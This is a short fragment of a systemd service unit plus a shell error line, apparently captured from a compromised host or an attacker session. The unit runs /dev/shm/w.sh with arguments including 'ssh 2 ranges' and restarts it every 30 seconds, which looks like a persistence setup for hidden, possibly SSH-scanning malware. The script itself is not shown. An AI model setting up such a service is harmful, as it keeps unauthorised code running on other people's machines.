Type=simple
WorkingDirectory=/dev/shm
ExecStart=/dev/shm/w.sh "astats" "netai" "kstats" "ssh 2 ranges"
Restart=always
RestartSec=30

[Install]
WantedBy=default.target
System has not been booted with systemd as init system.

